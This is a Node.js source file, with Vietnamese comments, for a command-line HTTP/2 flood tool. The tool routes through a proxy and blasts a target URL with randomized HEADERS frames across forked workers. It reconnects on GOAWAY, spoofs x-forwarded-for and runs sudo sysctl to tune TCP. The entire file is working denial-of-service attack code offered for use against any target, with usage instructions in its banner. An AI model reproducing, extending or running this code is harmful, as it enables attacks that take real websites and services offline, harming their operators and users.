const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const chalk = require("chalk");
const os = require("os");
const { exec } = require("child_process");
const HPACK = require("hpack");

// Cấu hình cipher và secure options
const ciphers = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256";
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256";
const ecdhCurve = "X25519:P-256";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;
const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers,
    sigalgs,
    honorCipherOrder: true,
    secureOptions,
    secureProtocol
});

// Danh sách header động
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,*/*;q=0.8'
];
const cache_header = ['no-cache'];
const language_header = ['en-US,en;q=0.7'];
const cplist = ["TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256"];

// Xử lý lỗi toàn cục
const ignoreCodes = ['ECONNRESET', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'ECONNREFUSED', 'EPIPE'];
const errorHandler = error => {
    if (!ignoreCodes.includes(error.code)) {
        console.error(chalk.red(`[LỖI] ${error.message}`));
    }
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

// Màu sắc cho log
const colors = {
    COLOR_RED: "\x1b[31m",
    COLOR_GREEN: "\x1b[32m",
    COLOR_YELLOW: "\x1b[33m",
    COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
}

// Hàm tạo chuỗi ngẫu nhiên
const charPool = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
const charPoolLength = charPool.length;
function generateRandomString(minLength, maxLength) {
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charPool[Math.floor(Math.random() * charPoolLength)];
    }
    return result;
}

// Hàm chọn ngẫu nhiên
function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Hàm mã hóa frame HTTP/2
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

// Hàm mã hóa RST_STREAM
function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4); // Type: RST_STREAM
    frameHeader.writeUInt32BE(streamId, 5);
    const error = Buffer.alloc(4);
    error.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, error]);
}

// Lớp NetSocket
class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "Lỗi: Phản hồi không hợp lệ từ proxy");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "Lỗi: Hết thời gian chờ");
        });

        connection.on("error", err => {
            connection.destroy();
            return callback(undefined, `Lỗi kết nối proxy: ${err.message}`);
        });
    }
}

const Socker = new NetSocket();

// Tùy chọn từ dòng lệnh
const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const proxy = process.argv[5];
const rate = parseInt(process.argv[6]);
const cookies = process.argv[7];
const userAgent = process.argv[8];

// Hàm tối ưu hóa TCP stack
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'bbr'];
    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl}`;
    exec(command, () => {});
}

// Hàm chạy flood
function runFlooder(targetURL, proxy, cookies, userAgent, rate, duration) {
    const parsedTarget = url.parse(targetURL);
    const parsedProxy = proxy.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 1
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            colored(colors.COLOR_RED, `[LỖI] ${error}`);
            return;
        }

        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: randomElement(cplist),
            sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions,
            secureContext,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 30000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxFrameSize: 16384
            }
        });

        client.setMaxListeners(0);
        client.settings({
            enablePush: false,
            initialWindowSize: 6291456
        });

        let hpack = new HPACK();
        hpack.setTableSize(4096);
        let streamId = 1;

        client.on("connect", () => {
            let requestCount = 0;
            const interval = setInterval(() => {
                const batchSize = Math.min(rate, 100); // Giới hạn batch size để tối ưu bộ nhớ
                const requests = [];

                for (let i = 0; i < batchSize; i++) {
                    const headers = {
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": parsedTarget.pathname + "?" + generateRandomString(3, 5) + "=" + generateRandomString(5, 10),
                        ":method": "GET", // Mặc định là GET
                        "user-agent": userAgent || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36`,
                        "accept": randomElement(accept_header),
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": randomElement(language_header),
                        "cache-control": randomElement(cache_header),
                        ...(cookies && { cookie: cookies }),
                        "x-forwarded-for": parsedProxy[0]
                    };

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(Object.entries(headers).filter(([_, v]) => v != null))
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;
                }

                tlsConn.write(Buffer.concat(requests), (err) => {
                    if (!err) {
                        requestCount += batchSize;
                        if (requestCount % 1000 === 0) {
                            colored(colors.COLOR_YELLOW, `[THÔNG TIN] Đã gửi ${requestCount} yêu cầu tới ${targetURL}`);
                        }
                    }
                });
            }, 10); // Giảm interval để tăng RPS

            // Xử lý GOAWAY
            let data = Buffer.alloc(0);
            tlsConn.on("data", (eventData) => {
                data = Buffer.concat([data, eventData]);
                while (data.length >= 9) {
                    const frame = decodeFrame(data);
                    if (frame != null) {
                        data = data.subarray(frame.length + 9);
                        if (frame.type === 7) { // GOAWAY
                            const rstFrames = [];
                            for (let i = 1; i <= streamId; i += 2) {
                                rstFrames.push(encodeRstStream(i, 0));
                            }
                            if (rstFrames.length > 0) {
                                tlsConn.write(Buffer.concat(rstFrames));
                            }
                            setImmediate(() => {
                                client.destroy();
                                tlsConn.destroy();
                                connection.destroy();
                                runFlooder(targetURL, proxy, cookies, userAgent, rate, duration);
                            });
                            return;
                        }
                    } else {
                        break;
                    }
                }
            });

            setTimeout(() => {
                clearInterval(interval);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                colored(colors.COLOR_YELLOW, `[THÔNG TIN] Hoàn tất flood ${targetURL} với ${requestCount} yêu cầu`);
            }, duration * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

// Hàm decode frame
function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9, 9 + length);
        if (payload.length !== length) return null;
    }

    return { streamId, length, type, flags, payload };
}

// Hàm chính
if (cluster.isMaster) {
    if (process.argv.length !== 9) {
        console.clear();
        console.log(`
${chalk.cyanBright('CÔNG CỤ FLOOD HTTP/2')} | Cập nhật: 01/10/2025

${chalk.blueBright('Cách dùng:')}
  ${chalk.redBright(`node ${process.argv[1]} <target> <duration> <threads> <proxy> <rate> <cookie> <userAgent>`)}
  ${chalk.yellowBright(`Ví dụ: node ${process.argv[1]} https://example.com 60 4 1.2.3.4:8080 12500 "cookie1=value1" "Mozilla/5.0..."`)}
`);
        process.exit(1);
    }

    if (!/^https?:\/\//i.test(targetURL)) {
        colored(colors.COLOR_RED, '[LỖI] URL phải bắt đầu bằng http:// hoặc https://');
        process.exit(1);
    }

    if (isNaN(duration) || duration <= 0 || duration > 86400) {
        colored(colors.COLOR_RED, '[LỖI] Thời gian không được vượt quá 86400 giây');
        process.exit(1);
    }

    if (isNaN(threads) || threads <= 0 || threads > 16) {
        colored(colors.COLOR_RED, '[LỖI] Số luồng không được vượt quá 16');
        process.exit(1);
    }

    if (!proxy.match(/^[\w\.-]+:\d+$/)) {
        colored(colors.COLOR_RED, '[LỖI] Proxy không hợp lệ, phải có định dạng host:port');
        process.exit(1);
    }

    colored(colors.COLOR_GREEN, `[THÔNG TIN] Đang chạy...`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Mục tiêu: ${targetURL}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Thời gian: ${duration} giây`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Luồng: ${threads}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Proxy: ${proxy}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Tốc độ: ${rate} yêu cầu/giây`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] Cookies: ${cookies || 'không có'}`);
    colored(colors.COLOR_GREEN, `[THÔNG TIN] User-Agent: ${userAgent}`);

    const MAX_RAM_PERCENTAGE = 90;
    const RESTART_DELAY = 500;

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            colored(colors.COLOR_RED, `[LỖI] RAM sử dụng vượt ngưỡng: ${ramPercentage.toFixed(2)}%`);
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            setTimeout(() => {
                for (let counter = 1; counter <= threads; counter++) {
                    cluster.fork();
                }
            }, RESTART_DELAY);
        }
    };

    setInterval(handleRAMUsage, 2000);
    setInterval(TCP_CHANGES_SERVER, 5000);

    for (let counter = 1; counter <= threads; counter++) {
        cluster.fork();
    }

    setTimeout(() => {
        colored(colors.COLOR_YELLOW, '[THÔNG TIN] Hết thời gian! Dọn dẹp...');
        process.exit(0);
    }, duration * 1000);
} else {
    setInterval(() => {
        runFlooder(targetURL, proxy, cookies, userAgent, rate, duration);
    }, 50);
}